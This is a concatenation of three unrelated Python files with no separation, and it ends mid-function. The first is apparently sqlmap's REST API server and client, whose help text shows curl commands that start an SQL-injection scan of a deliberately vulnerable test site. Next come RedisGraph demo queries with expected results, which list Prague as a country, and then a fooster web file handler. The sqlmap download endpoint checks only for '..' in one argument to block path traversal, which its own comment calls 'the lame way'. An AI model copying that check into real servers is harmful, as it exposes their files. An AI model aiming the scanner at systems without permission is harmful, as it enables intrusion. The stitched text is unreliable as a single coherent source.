    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug("Created new task: '%s'" % taskid)
    return jsonize({"success": True, "taskid": taskid})


@get("/task/<taskid>/delete")
def task_delete(taskid):
    """
    Delete own task ID
    """
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug("[%s] Deleted task" % taskid)
        return jsonize({"success": True})
    else:
        logger.warning("[%s] Invalid task ID provided to task_delete()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

###################
# Admin functions #
###################


@get("/admin/<taskid>/list")
def task_list(taskid=None):
    """
    List task pull
    """
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))["status"]

    logger.debug("[%s] Listed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True, "tasks": tasks, "tasks_num": len(tasks)})

@get("/admin/<taskid>/flush")
def task_flush(taskid):
    """
    Flush task spool (delete all tasks)
    """

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug("[%s] Flushed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get("/option/<taskid>/list")
def option_list(taskid):
    """
    List options for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_list()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    logger.debug("[%s] Listed task options" % taskid)
    return jsonize({"success": True, "options": DataStore.tasks[taskid].get_options()})


@post("/option/<taskid>/get")
def option_get(taskid):
    """
    Get the value of an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_get()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    option = request.json.get("option", "")

    if option in DataStore.tasks[taskid].options:
        logger.debug("[%s] Retrieved value for option %s" % (taskid, option))
        return jsonize({"success": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug("[%s] Requested value for unknown option %s" % (taskid, option))
        return jsonize({"success": False, "message": "Unknown option", option: "not set"})


@post("/option/<taskid>/set")
def option_set(taskid):
    """
    Set an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_set()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug("[%s] Requested to set options" % taskid)
    return jsonize({"success": True})


# Handle scans
@post("/scan/<taskid>/start")
def scan_start(taskid):
    """
    Launch a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_start()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug("[%s] Started scan" % taskid)
    return jsonize({"success": True, "engineid": DataStore.tasks[taskid].engine_get_id()})


@get("/scan/<taskid>/stop")
def scan_stop(taskid):
    """
    Stop a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_stop()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_stop()

    logger.debug("[%s] Stopped scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/kill")
def scan_kill(taskid):
    """
    Kill a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_kill()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_kill()

    logger.debug("[%s] Killed scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/status")
def scan_status(taskid):
    """
    Returns status of a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_status()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if DataStore.tasks[taskid].engine_process() is None:
        status = "not running"
    else:
        status = "terminated" if DataStore.tasks[taskid].engine_has_terminated() is True else "running"

    logger.debug("[%s] Retrieved scan status" % taskid)
    return jsonize({
        "success": True,
        "status": status,
        "returncode": DataStore.tasks[taskid].engine_get_returncode()
    })


@get("/scan/<taskid>/data")
def scan_data(taskid):
    """
    Retrieve the data of a scan
    """
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_data()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            "SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_data_message.append(
            {"status": status, "type": content_type, "value": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            "SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug("[%s] Retrieved scan data and error messages" % taskid)
    return jsonize({"success": True, "data": json_data_message, "error": json_errors_message})


# Functions to handle scans' logs
@get("/scan/<taskid>/log/<start>/<end>")
def scan_log_limited(taskid, start, end):
    """
    Retrieve a subset of log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning("[%s] Invalid start or end value provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid start or end value, must be digits"})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ("SELECT time, level, message FROM logs WHERE "
             "taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC"),
            (taskid, start, end)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages subset" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


@get("/scan/<taskid>/log")
def scan_log(taskid):
    """
    Retrieve the log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            "SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC", (taskid,)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


# Function to handle files inside the output directory
@get("/download/<taskid>/<target>/<filename:path>")
def download(taskid, target, filename):
    """
    Download a certain file from the file system
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to download()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Prevent file path traversal - the lame way
    if ".." in target:                    
        logger.warning("[%s] Forbidden path (%s)" % (taskid, target))
        return jsonize({"success": False, "message": "Forbidden path"})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)                    

    if os.path.exists(path):                    
        logger.debug("[%s] Retrieved content of file %s" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({"success": True, "file": file_content.encode("base64")})
    else:
        logger.warning("[%s] File does not exist %s" % (taskid, target))
        return jsonize({"success": False, "message": "File does not exist"})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """
    REST-JSON API server
    """
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix="sqlmapipc-", text=False)[1]

    logger.info("Running REST-JSON API server at '%s:%d'.." % (host, port))
    logger.info("Admin ID: %s" % DataStore.admin_id)
    logger.debug("IPC database: %s" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == "gevent":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == "eventlet":
            import eventlet
            eventlet.monkey_patch()
        logger.debug("Using adapter '%s' to run bottle" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if "already in use" in getSafeExString(ex):
            logger.error("Address already in use ('%s:%s')" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = "Adapter '%s' is not available on this system" % adapter
        if adapter in ("gevent", "eventlet"):
            errMsg += " (e.g.: 'sudo apt-get install python-%s')" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug("Calling %s" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error("Failed to load and parse %s" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """
    REST-JSON API client
    """

    dbgMsg = "Example client access from command line:"
    dbgMsg += "\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid" % (host, port)
    dbgMsg += "\n\t$ curl -H \"Content-Type: application/json\" -X POST -d '{\"url\": \"http://testphp.vulnweb.com/artists.php?artist=1\"}' http://%s:%d/scan/$taskid/start" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/data" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/log" % (host, port)
    logger.debug(dbgMsg)

    addr = "http://%s:%d" % (host, port)
    logger.info("Starting REST-JSON API client to '%s'..." % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = "There has been a problem while connecting to the "
            errMsg += "REST-JSON API server at '%s' " % addr
            errMsg += "(%s)" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info("Type 'help' or '?' for list of available commands")

    while True:
        try:
            command = raw_input("api%s> " % (" (%s)" % taskid if taskid else "")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in ("data", "log", "status", "stop", "kill"):
            if not taskid:
                logger.error("No task ID in use")
                continue
            raw = _client("%s/scan/%s/%s" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            dataToStdout("%s\n" % raw)

        elif command.startswith("new"):
            if ' ' not in command:
                logger.error("Program arguments are missing")
                continue

            argv = ["sqlmap.py"] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client("%s/task/new" % addr)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to create new task")
                continue
            taskid = res["taskid"]
            logger.info("New task ID is '%s'" % taskid)

            raw = _client("%s/scan/%s/start" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to start scan")
                continue
            logger.info("Scanning started")

        elif command.startswith("use"):
            taskid = (command.split()[1] if ' ' in command else "").strip("'\"")
            if not taskid:
                logger.error("Task ID is missing")
                taskid = None
                continue
            elif not re.search(r"\A[0-9a-fA-F]{16}\Z", taskid):
                logger.error("Invalid task ID '%s'" % taskid)
                taskid = None
                continue
            logger.info("Switching to task ID '%s' " % taskid)

        elif command in ("list", "flush"):
            raw = _client("%s/admin/%s/%s" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            elif command == "flush":
                taskid = None
            dataToStdout("%s\n" % raw)

        elif command in ("exit", "bye", "quit", 'q'):
            return

        elif command in ("help", "?"):
            msg =  "help        Show this help message\n"
            msg += "new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \"http://testphp.vulnweb.com/artists.php?artist=1\"')\n"
            msg += "use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n"
            msg += "data        Retrieve and show data for current task\n"
            msg += "log         Retrieve and show log for current task\n"
            msg += "status      Retrieve and show status for current task\n"
            msg += "stop        Stop current task\n"
            msg += "kill        Kill current task\n"
            msg += "list        Display all tasks\n"
            msg += "flush       Flush tasks (delete all tasks)\n"
            msg += "exit        Exit this client\n"

            dataToStdout(msg)

        elif command:
            logger.error("Unknown command '%s'" % command)

import sys
import os

sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../../')
from demo import QueryInfo

graph_entities = QueryInfo(
    query="""MATCH (e) RETURN e.name, LABELS(e) as label ORDER BY label, e.name""",
    description='Returns each node in the graph, specifing node label.',
    max_run_time_ms=0.2,
    expected_result=[['Netherlands','country'],
                     ['Andora','country'],
                     ['Canada','country'],
                     ['China','country'],
                     ['Germany','country'],
                     ['Greece','country'],
                     ['Italy','country'],
                     ['Japan','country'],
                     ['Kazakhstan','country'],
                     ['Prague','country'],
                     ['Russia','country'],
                     ['Thailand','country'],
                     ['USA','country'],
                     ['Ailon Velger','person'],
                     ['Alon Fital','person'],
                     ['Boaz Arad','person'],
                     ['Gal Derriere','person'],
                     ['Jane Chernomorin','person'],
                     ['Lucy Yanfital','person'],
                     ['Mor Yesharim','person'],
                     ['Noam Nativ','person'],
                     ['Omri Traub','person'],
                     ['Ori Laslo','person'],
                     ['Roi Lipman','person'],
                     ['Shelly Laslo Rooz','person'],
                     ['Tal Doron','person'],
                     ['Valerie Abigail Arad','person']]
)

relation_type_counts = QueryInfo(
    query="""MATCH ()-[e]->() RETURN TYPE(e) as relation_type, COUNT(e) as num_relations ORDER BY relation_type, num_relations""",
    description='Returns each relation type in the graph and its count.',
    max_run_time_ms=0.4,
    expected_result=[['friend', 13],
                     ['visited', 43]]
)

subset_of_people = QueryInfo(
    query="""MATCH (p:person) RETURN p.name ORDER BY p.name SKIP 3 LIMIT 5""",
    description='Get a subset of people.',
    max_run_time_ms=0.2,
    expected_result=[["Gal Derriere"],
                    ["Jane Chernomorin"],
                    ["Lucy Yanfital"],
                    ["Mor Yesharim"],
                    ["Noam Nativ"]]
)

my_friends_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[:friend]->(f:person) 
             RETURN f.name""",
    description='My friends?',
    max_run_time_ms=0.2,
    expected_result=[['Tal Doron'],
                     ['Omri Traub'],
                     ['Boaz Arad'],
                     ['Ori Laslo'],
                     ['Ailon Velger'],
                     ['Alon Fital']]
)

friends_of_friends_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[:friend]->(:person)-[:friend]->(fof:person) 
             RETURN fof.name""",
    description='Friends of friends?',
    max_run_time_ms=0.2,
    expected_result=[['Valerie Abigail Arad'],
                     ['Shelly Laslo Rooz'],
                     ['Noam Nativ'],
                     ['Jane Chernomorin'],
                     ['Mor Yesharim'],
                     ['Gal Derriere'],
                     ['Lucy Yanfital']]
)

friends_of_friends_single_and_over_30_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[:friend]->(:person)-[:friend]->(fof:person {status:"single"})
             WHERE fof.age > 30
             RETURN fof.name, fof.age, fof.gender, fof.status""",
    description='Friends of friends who are single and over 30?',
    max_run_time_ms=0.25,
    expected_result=[['Noam Nativ', 34, 'male', 'single']]
)

friends_of_friends_visited_netherlands_and_single_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[:friend]->(:person)-[:friend]->
             (fof:person {status:"single"})-[:visited]->(:country {name:"Netherlands"})
             RETURN fof.name""",
    description='Friends of friends who visited Netherlands and are single?',
    max_run_time_ms=0.3,
    expected_result=[['Noam Nativ'],
                     ['Gal Derriere']]
)

friends_visited_same_places_as_me_query = QueryInfo(
    query="""MATCH (:person {name:"Roi Lipman"})-[:visited]->(c:country)<-[:visited]-(f:person)<-                    
             [:friend]-(:person {name:"Roi Lipman"})                     
             RETURN f.name, c.name""",
    description='Friends who have been to places I have visited?',
    max_run_time_ms=0.45,
    expected_result=[['Tal Doron', 'Japan'],
                     ['Alon Fital', 'Prague'],
                     ['Tal Doron', 'USA'],
                     ['Omri Traub', 'USA'],
                     ['Boaz Arad', 'USA'],
                     ['Ori Laslo', 'USA'],
                     ['Alon Fital', 'USA']]
)

friends_older_than_me_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[:friend]->(f:person)
             WHERE f.age > ME.age
             RETURN f.name, f.age""",
    description='Friends who are older than me?',
    max_run_time_ms=0.25,
    expected_result=[['Omri Traub', 33]]
)

friends_age_difference_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[:friend]->(f:person)
             RETURN f.name, abs(ME.age - f.age) AS age_diff
             ORDER BY age_diff desc""",
    description='Age difference between me and each of my friends.',
    max_run_time_ms=0.35,
    expected_result=[['Boaz Arad', 1],
                     ['Omri Traub', 1],
                     ['Ailon Velger', 0],
                     ['Tal Doron', 0],
                     ['Ori Laslo', 0],
                     ['Alon Fital', 0]]
)

friends_who_are_older_than_average = QueryInfo(
    query="""MATCH (p:person)
             WITH avg(p.age) AS average_age 
             MATCH(:person)-[:friend]->(f:person) 
             WHERE f.age > average_age 
             RETURN f.name, f.age, round(f.age - average_age) AS age_diff 
             ORDER BY age_diff, f.name DESC
             LIMIT 4""",
    description='Friends who are older then the average age.',
    max_run_time_ms=0.35,
    expected_result=[['Noam Nativ', 34, 3.0],
                     ['Omri Traub', 33, 2.0],
                     ['Tal Doron', 32, 1.0],
                     ['Ori Laslo', 32, 1.0]]
)

how_many_countries_each_friend_visited_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[:friend]->(friend:person)-[:visited]->(c:country)
             RETURN friend.name, count(c.name) AS countriesVisited
             ORDER BY countriesVisited DESC
             LIMIT 10""",
    description='Count for each friend how many countires he or she been to?',
    max_run_time_ms=0.3,
    expected_result=[['Alon Fital', 3],
                     ['Omri Traub', 3],
                     ['Tal Doron', 3],
                     ['Ori Laslo', 3],
                     ['Boaz Arad', 2]]
)

happy_birthday_query = QueryInfo(
    query = """MATCH (:person {name:"Roi Lipman"})-[:friend]->(f:person)
               SET f.age = f.age + 1
               RETURN f.name, f.age order by f.name, f.age""",
    description='Update friends age.',
    max_run_time_ms=0.25,
    expected_result=[['Ailon Velger', 33],
                     ['Alon Fital',   33],
                     ['Boaz Arad',    32],
                     ['Omri Traub',   34],
                     ['Ori Laslo',    33],
                     ['Tal Doron',    33]]
)

friends_age_statistics_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[:friend]->(f:person)
             RETURN ME.name, count(f.name), sum(f.age), avg(f.age), min(f.age), max(f.age)""",
    description='Friends age statistics.',
    max_run_time_ms=0.2,
    expected_result=[['Roi Lipman', 6, 198.0, 33.0, 32, 34]]
)

visit_purpose_of_each_country_i_visited_query = QueryInfo(
    query="""MATCH (ME:person {name:"Roi Lipman"})-[v:visited]->(c:country) 
             RETURN c.name, v.purpose""",
    description='For each country i have been to, what was the visit purpose?',
    max_run_time_ms=0.2,
    expected_result=[['Japan', 'pleasure'],
                     ['Prague', 'pleasure'],
                     ['Prague', 'business'],
                     ['USA', 'business']]
)

who_was_on_business_trip_query = QueryInfo(
    query="""MATCH (p:person)-[v:visited {purpose:"business"}]->(c:country)
             RETURN p.name, v.purpose, toUpper(c.name)""",
    description='Find out who went on a business trip?',
    max_run_time_ms=0.3,
    expected_result=[['Boaz Arad', 'business','NETHERLANDS'],
                     ['Boaz Arad', 'business','USA'],
                     ['Ori Laslo', 'business', 'CHINA'],
                     ['Ori Laslo', 'business', 'USA'],
                     ['Jane Chernomorin', 'business', 'USA'],
                     ['Alon Fital', 'business', 'USA'],
                     ['Alon Fital', 'business', 'PRAGUE'],
                     ['Mor Yesharim', 'business', 'GERMANY'],
                     ['Gal Derriere', 'business', 'NETHERLANDS'],
                     ['Lucy Yanfital', 'business', 'USA'],
                     ['Roi Lipman', 'business', 'USA'],
                     ['Roi Lipman', 'business', 'PRAGUE'],
                     ['Tal Doron', 'business', 'USA'],
                     ['Tal Doron', 'business', 'JAPAN']]
)

number_of_vacations_per_person_query = QueryInfo(
    query="""MATCH (p:person)-[v:visited {purpose:"pleasure"}]->(c:country)
             RETURN p.name, count(v.purpose) AS vacations
             ORDER BY vacations DESC
             LIMIT 6""",
    description='Count number of vacations per person?',
    max_run_time_ms=0.5,
    expected_result=[['Noam Nativ', 3],
                     ['Shelly Laslo Rooz', 3],
                     ['Omri Traub', 3],
                     ['Lucy Yanfital', 3],
                     ['Jane Chernomorin', 3],
                     ['Alon Fital', 3]]
)

all_reachable_friends_query = QueryInfo(
    query="""MATCH (a:person {name:'Roi Lipman'})-[:friend*]->(b:person)
             RETURN b.name
             ORDER BY b.name""",
    description='Find all reachable friends',
    max_run_time_ms=0.3,
    expected_result=[['Ailon Velger'],
                     ['Alon Fital'],
                     ['Boaz Arad'],
                     ['Gal Derriere'],
                     ['Jane Chernomorin'],
                     ['Lucy Yanfital'],
                     ['Mor Yesharim'],
                     ['Noam Nativ'],
                     ['Omri Traub'],
                     ['Ori Laslo'],
                     ['Shelly Laslo Rooz'],
                     ['Tal Doron'],
                     ['Valerie Abigail Arad']]
)

all_reachable_countries_query = QueryInfo(
    query="""MATCH (a:person {name:'Roi Lipman'})-[*]->(c:country)
             RETURN c.name, count(c.name) AS NumPathsToCountry
             ORDER BY NumPathsToCountry DESC""",
    description='Find all reachable countries',
    max_run_time_ms=0.6,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Canada', 2],
                     ['China', 2],
                     ['Andora', 2],
                     ['Germany', 2],
                     ['Japan', 2],
                     ['Russia', 1],
                     ['Italy', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1]]
)

reachable_countries_or_people_query = QueryInfo(
    query="""MATCH (s:person {name:'Roi Lipman'})-[e:friend|:visited]->(t)
             RETURN s.name,TYPE(e),t.name
             ORDER BY t.name""",
    description='Every person or country one hop away from source node',
    max_run_time_ms=0.2,
    expected_result=[["Roi Lipman", "friend", "Ailon Velger"],
                     ["Roi Lipman", "friend", "Alon Fital"],
                     ["Roi Lipman", "friend", "Boaz Arad"],
                     ["Roi Lipman", "visited", "Japan"],
                     ["Roi Lipman", "friend", "Omri Traub"],
                     ["Roi Lipman", "friend", "Ori Laslo"],
                     ["Roi Lipman", "visited", "Prague"],
                     ["Roi Lipman", "visited", "Prague"],
                     ["Roi Lipman", "friend", "Tal Doron"],
                     ["Roi Lipman", "visited", "USA"]]
)

all_reachable_countries_or_people_query = QueryInfo(
    query="""MATCH (a:person {name:'Roi Lipman'})-[:friend|:visited*]->(e)
             RETURN e.name, count(e.name) AS NumPathsToEntity
             ORDER BY NumPathsToEntity DESC""",
    description='Every reachable person or country from source node',
    max_run_time_ms=0.4,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Andora', 2],
                     ['Japan', 2],
                     ['Germany', 2],
                     ['Canada', 2],
                     ['China', 2],
                     ['Ailon Velger', 1],
                     ['Alon Fital', 1],
                     ['Gal Derriere', 1],
                     ['Jane Chernomorin', 1],
                     ['Omri Traub', 1],
                     ['Boaz Arad', 1],
                     ['Noam Nativ', 1],
                     ['Shelly Laslo Rooz', 1],
                     ['Russia', 1],
                     ['Valerie Abigail Arad', 1],
                     ['Mor Yesharim', 1],
                     ['Italy', 1],
                     ['Tal Doron', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1],
                     ['Lucy Yanfital', 1],
                     ['Ori Laslo', 1]]
)

all_reachable_entities_query = QueryInfo(
    query="""MATCH (a:person {name:'Roi Lipman'})-[*]->(e)
             RETURN e.name, count(e.name) AS NumPathsToEntity
             ORDER BY NumPathsToEntity DESC""",
    description='Find all reachable entities',
    max_run_time_ms=0.4,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Andora', 2],
                     ['Japan', 2],
                     ['Germany', 2],
                     ['Canada', 2],
                     ['China', 2],
                     ['Ailon Velger', 1],
                     ['Alon Fital', 1],
                     ['Gal Derriere', 1],
                     ['Jane Chernomorin', 1],
                     ['Omri Traub', 1],
                     ['Boaz Arad', 1],
                     ['Noam Nativ', 1],
                     ['Shelly Laslo Rooz', 1],
                     ['Russia', 1],
                     ['Valerie Abigail Arad', 1],
                     ['Mor Yesharim', 1],
                     ['Italy', 1],
                     ['Tal Doron', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1],
                     ['Lucy Yanfital', 1],
                     ['Ori Laslo', 1]]
)

delete_friendships_query = QueryInfo(
    query="""MATCH (ME:person {name:'Roi Lipman'})-[e:friend]->() DELETE e""",
    description='Delete frienships',
    max_run_time_ms=0.25,
    expected_result=[]
)

delete_person_query = QueryInfo(
    query="""MATCH (ME:person {name:'Roi Lipman'}) DELETE ME""",
    description='Delete myself from the graph',
    max_run_time_ms=0.2,
    expected_result=[]
)

post_delete_label_query = QueryInfo(
    query="""MATCH (p:person) RETURN p.name""",
    description='Retrieve all nodes with person label',
    max_run_time_ms=0.15,
    expected_result=[['Boaz Arad'],
                     ['Valerie Abigail Arad'],
                     ['Ori Laslo'],
                     ['Shelly Laslo Rooz'],
                     ['Ailon Velger'],
                     ['Noam Nativ'],
                     ['Jane Chernomorin'],
                     ['Alon Fital'],
                     ['Mor Yesharim'],
                     ['Gal Derriere'],
                     ['Lucy Yanfital'],
                     ['Tal Doron'],
                     ['Omri Traub']]
)

queries_info = [
    graph_entities,
    relation_type_counts,
    subset_of_people,
    my_friends_query,
    friends_of_friends_query,
    friends_of_friends_single_and_over_30_query,
    friends_of_friends_visited_netherlands_and_single_query,
    friends_visited_same_places_as_me_query,
    friends_older_than_me_query,
    friends_age_difference_query,
    friends_who_are_older_than_average,
    how_many_countries_each_friend_visited_query,    
    visit_purpose_of_each_country_i_visited_query,
    who_was_on_business_trip_query,
    number_of_vacations_per_person_query,
    all_reachable_friends_query,
    all_reachable_countries_query,
    reachable_countries_or_people_query,
    all_reachable_countries_or_people_query,
    all_reachable_entities_query,
    happy_birthday_query,
    friends_age_statistics_query,
    delete_friendships_query,
    delete_person_query,
    post_delete_label_query
]

import collections
import mimetypes
import os
import re
import shutil
import urllib.parse                    

from fooster import web


def normpath(path):
    old_path = path.split('/')
    new_path = collections.deque()

    for entry in old_path:
        # ignore empty paths - A//B -> A/B
        if not entry:
            continue
        # ignore dots - A/./B -> A/B
        elif entry == '.':
            continue
        # go back a level by popping the last directory off (if there is one) - A/foo/../B -> A/B
        elif entry == '..':
            if len(new_path) > 0:
                new_path.pop()
        else:
            new_path.append(entry)

    # special case for leading slashes
    if old_path[0] == '':
        new_path.appendleft('')

    # special case for trailing slashes
    if old_path[-1] == '':
        new_path.append('')

    return '/'.join(new_path)


class FileHandler(web.HTTPHandler):
    filename = None
    dir_index = False

    def index(self):
        # magic for stringing together everything in the directory with a newline and adding a / at the end for directories
        return ''.join(filename + '/\n' if os.path.isdir(os.path.join(self.filename, filename)) else filename + '\n' for filename in os.listdir(self.filename))

    def get_body(self):
        return False

    def do_get(self):
        try:
            if os.path.isdir(self.filename):
                # if necessary, redirect to add trailing slash
                if not self.filename.endswith('/'):
                    self.response.headers.set('Location', self.request.resource + '/')

                    return 307, ''

                # check for index file
                index = self.filename + 'index.html'
                if os.path.exists(index) and os.path.isfile(index):
                    indexfile = open(index, 'rb')
                    self.response.headers.set('Content-Type', 'text/html')
                    self.response.headers.set('Content-Length', str(os.path.getsize(index)))

                    return 200, indexfile
                elif self.dir_index:
                    # if no index and directory indexing enabled, send a generated one
                    return 200, self.index()
                else:
                    raise web.HTTPError(403)
            else:
                file = open(self.filename, 'rb')

                # get file size from metadata
                size = os.path.getsize(self.filename)
                length = size

                # HTTP status that changes if partial data is sent
                status = 200

                # handle range header and modify file pointer and content length as necessary
                range_header = self.request.headers.get('Range')
                if range_header:
                    range_match = re.match('bytes=(\d+)-(\d+)?', range_header)
                    if range_match:
                        # get lower and upper bounds
                        lower = int(range_match.group(1))
                        if range_match.group(2):
                            upper = int(range_match.group(2))
                        else:
                            upper = size - 1

                        # sanity checks
                        if upper < size and upper >= lower:
                            file.seek(lower)
                            self.response.headers.set('Content-Range', 'bytes ' + str(lower) + '-' + str(upper) + '/' + str(size))
                            length = upper - lower + 1
                            status = 206

                self.response.headers.set('Content-Length', str(length))

                # tell client we allow selecting ranges of bytes
                self.response.headers.set('Accept-Ranges', 'bytes')

                # guess MIME by extension
                mime = mimetypes.guess_type(self.filename)[0]
                if mime:
                    self.response.headers.set('Content-Type', mime)

                return status, file
        except FileNotFoundError:
            raise web.HTTPError(404)
        except NotADirectoryError:
            raise web.HTTPError(404)
        except OSError:
            raise web.HTTPError(403)


class ModifyMixIn:
    def do_put(self):
        try:
            # make sure directories are there (including the given one if not given a file)
            os.makedirs(os.path.dirname(self.filename), exist_ok=True)

            # send a 100 continue if expected
            if self.request.headers.get('Expect') == '100-continue':
                self.check_continue()
                self.response.wfile.write((web.http_version + ' 100 ' + web.status_messages[100] + '\r\n\r\n').encode(web.http_encoding))
                self.response.wfile.flush()

            # open (possibly new) file and fill it with request body
